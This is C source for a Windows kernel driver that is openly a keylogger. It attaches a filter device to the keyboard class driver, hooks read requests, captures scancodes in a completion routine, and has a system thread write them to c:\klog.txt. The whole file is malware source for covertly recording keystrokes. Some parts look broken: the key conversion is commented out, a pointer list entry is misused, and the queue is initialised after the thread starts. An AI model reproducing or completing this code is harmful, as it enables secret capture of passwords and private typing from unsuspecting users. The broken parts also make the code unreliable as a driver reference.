#include <ntddk.h>
#include <ntddkbd.h>

int numPendingIrps = 0;

typedef struct _DEVICE_EXTENSION
{
	PDEVICE_OBJECT	pKeyboardDevice;
	PETHREAD		pThreadObj;
	int				bThreadTerminate;
	HANDLE			hLogFile;
	KEY_STATE		kState;
	KSEMAPHORE		semQueue;
	KSPIN_LOCK		lockQueue;
	LIST_ENTRY		QueueListHead;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

typedef struct _KEY_DATA {
	CCHAR KeyData;
	CCHAR KeyFlags;
	PLIST_ENTRY ListEntry;
} KEY_DATA;

NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
{
	// the filter device object
	PDEVICE_OBJECT pKeyboardDeviceObject;
	
	// Create a keyboard device object.
	NTSTATUS status = IoCreateDevice(pDriverObject,
		sizeof(DEVICE_EXTENSION),
		NULL,// no name
		FILE_DEVICE_KEYBOARD,
		0,
		1,
		&pKeyboardDeviceObject);

	// Make sure the device was created.
	if (!NT_SUCCESS(status))
		return status;

	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;

	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));

	// Get the pointer to the device extension.
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;
	CCHAR ntNameBuffer[64] = "\\Device\\KeyboardClass0";
	STRING  ntNameString;
	UNICODE_STRING uKeyboardDeviceName;

	RtlInitAnsiString(&ntNameString, ntNameBuffer);
	RtlAnsiStringToUnicodeString(&uKeyboardDeviceName, &ntNameString, 1);

	IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
	RtlFreeUnicodeString(&uKeyboardDeviceName);

	return STATUS_SUCCESS;
}// end HookKeyboard


VOID ThreadKeyLogger(IN PVOID pContext)
{

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
	PDEVICE_OBJECT pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;

	PLIST_ENTRY pListEntry;
	KEY_DATA* kData; // custom data structure used to hold scancodes in the linked list
	while (1)
	{
		// Wait for data to become available in the queue.
		KeWaitForSingleObject(
			&pKeyboardDeviceExtension->semQueue,
			Executive,
			KernelMode,
			0,
			NULL);

		pListEntry = ExInterlockedRemoveHeadList(
			&pKeyboardDeviceExtension->QueueListHead,
			&pKeyboardDeviceExtension->lockQueue);

		if (pKeyboardDeviceExtension->bThreadTerminate == 1) {
			PsTerminateSystemThread(STATUS_SUCCESS);
		}

		kData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
		// Convert the scan code to a key code.

		char keys[3] = { 0 };
		//ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, kData, keys);

		 //Make sure the key has returned a valid code
		 //before writing it to the file.

		if (keys != 0)
		{
			// Write the data out to a file.
			if (pKeyboardDeviceExtension->hLogFile != NULL)
			{

				IO_STATUS_BLOCK io_status;
				NTSTATUS status = ZwWriteFile(
					pKeyboardDeviceExtension->hLogFile,
					NULL,
					NULL,
					NULL,
					&io_status,
					&keys,
					strlen(keys),
					NULL,
					NULL);

				if (status != STATUS_SUCCESS)
					DbgPrint("Writing scan code to file...\n");
				else
					DbgPrint("Scan code '%s' successfully written to file.\n", keys);
			}// end if
		}// end if
	}// end while

	return;
}// end ThreadLogKeyboard


NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	// Set the worker thread to running state in device extension.

	pKeyboardDeviceExtension->bThreadTerminate = FALSE;
	// Create the worker thread.

	HANDLE hThread;
	NTSTATUS status = PsCreateSystemThread(&hThread,
		(ACCESS_MASK)0,
		NULL,
		(HANDLE)0,
		NULL,
		ThreadKeyLogger,
		pKeyboardDeviceExtension);

	if (!NT_SUCCESS(status))
		return status;
	// Obtain a pointer to the thread object.

	ObReferenceObjectByHandle(hThread,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID*)&pKeyboardDeviceExtension->pThreadObj,
		NULL);

	// We don't need the thread handle.

	ZwClose(hThread);
	return status;
}


NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
{

	// Get the device extension - we'll need to use it later.
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	// If the request has completed, extract the value of the key.
	if (pIrp->IoStatus.Status == STATUS_SUCCESS) {
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		
		for (int i = 0; i < numKeys; i++) {
			DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
			if (keys[i].Flags == KEY_MAKE)
				DbgPrint("%s\n", "Key Down");

			KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));

			// Fill in kData structure with info from IRP.
			kData->KeyData = (char)keys[i].MakeCode;
			kData->KeyFlags = (char)keys[i].Flags;
			// Add the scan code to the linked list

			// queue so our worker thread

			// can write it out to a file.

			DbgPrint("Adding IRP to work queue...");
			ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead,
				&kData->ListEntry,
				&pKeyboardDeviceExtension->lockQueue);

			//The semaphore is incremented to indicate that some data needs to be processed :
			// Increment the semaphore by 1 - no WaitForXXX after this call.

			KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue,
				0,
				1,
				0);
		}// end for
	}// end if

	// Mark the IRP pending if necessary.

	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);
	
	numPendingIrps--;
	return pIrp->IoStatus.Status;

}// end OnReadCompletion


NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	// Copy parameters down to next level in the stack

	// for the driver below us.
	IoCopyCurrentIrpStackLocationToNext(pIrp);

	//Note that the completion routine is named "OnReadCompletion":
	// Set the completion callback.
	IoSetCompletionRoutine(pIrp,
		OnReadCompletion,
		pDeviceObject,
		1,
		1,
		1);
	// Track the # of pending IRPs.

	numPendingIrps++;
	// Pass the IRP on down to \the driver underneath us.

	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}// end DispatchRead

VOID Unload(IN PDRIVER_OBJECT pDriverObject)
{

	// Get the pointer to the device extension.
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	DbgPrint("Driver Unload Called...\n");
	// Detach from the device underneath that we're hooked to.

	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	DbgPrint("Keyboard hook detached from device...\n");
	// Create a timer.

	KTIMER kTimer;
	LARGE_INTEGER timeout;

	timeout.QuadPart = 1000000;// .1 s

	KeInitializeTimer(&kTimer);
	while (numPendingIrps > 0)
	{

		// Set the timer.
		KeSetTimer(&kTimer, timeout, NULL);
		KeWaitForSingleObject(
			&kTimer,
			Executive,
			KernelMode,
			0,
			NULL);
	}

	// Set our key logger worker thread to terminate.
	pKeyboardDeviceExtension->bThreadTerminate = 1;
	// Wake up the thread if its blocked & WaitForXXX after this call.
	KeReleaseSemaphore(
		&pKeyboardDeviceExtension->semQueue,
		0,
		1,
		1);
	// Wait until the worker thread terminates.

	DbgPrint("Waiting for key logger thread to terminate...\n");
	KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj,
		Executive,
		KernelMode,
		0, NULL);

	DbgPrint("Key logger thread terminated\n");
	// Close the log file.

	ZwClose(pKeyboardDeviceExtension->hLogFile);
	// Delete the device.

	IoDeleteDevice(pDriverObject->DeviceObject);
	DbgPrint("Tagged IRPs dead...Terminating...\n");
	return;
}

NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	DbgPrint("Entering DispatchPassDown Routine...\n");
	//pass the irp down to the target without touching it   
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING RegistryPath)
{

	NTSTATUS Status = { 0 };
	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DispatchPassDown;
	// Explicitly fill in the IRP handlers we want to hook.

	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
	// Hook the keyboard now.

	HookKeyboard(pDriverObject);
	InitThreadKeyLogger(pDriverObject);

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	InitializeListHead(&pKeyboardDeviceExtension->QueueListHead);

	// Initialize the lock for the linked list queue.
	KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);
	// Initialize the work queue semaphore.
	KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0, MAXLONG);

	// Create the log file.

	IO_STATUS_BLOCK file_status;
	OBJECT_ATTRIBUTES obj_attrib;
	CCHAR  ntNameFile[64] = "\\DosDevices\\c:\\klog.txt";
	STRING ntNameString;
	UNICODE_STRING uFileName;

	RtlInitAnsiString(&ntNameString, ntNameFile);
	RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, 1);
	InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL,NULL);
	//InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_KERNEL_HANDLE, NULL, NULL);

	DbgPrint("---%x\n", pKeyboardDeviceExtension->hLogFile);
	Status = ZwCreateFile(&pKeyboardDeviceExtension->hLogFile,
		GENERIC_WRITE,
		&obj_attrib,
		&file_status,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);

	RtlFreeUnicodeString(&uFileName);

	if (Status != STATUS_SUCCESS)
	{
		DbgPrint("Failed to create log file...\n");
		DbgPrint("File Status = %x\n", file_status);
		DbgPrint("Status = %x\n", Status);
	}
	else
	{
		DbgPrint("Successfully created log file...\n");
		DbgPrint("File Handle = %x\n",
		pKeyboardDeviceExtension->hLogFile);
	}

	// Set the DriverUnload procedure.
	pDriverObject->DriverUnload = Unload;
	DbgPrint("Set DriverUnload function pointer...\n");
	DbgPrint("Exiting Driver Entry......\n");
	return STATUS_SUCCESS;
}
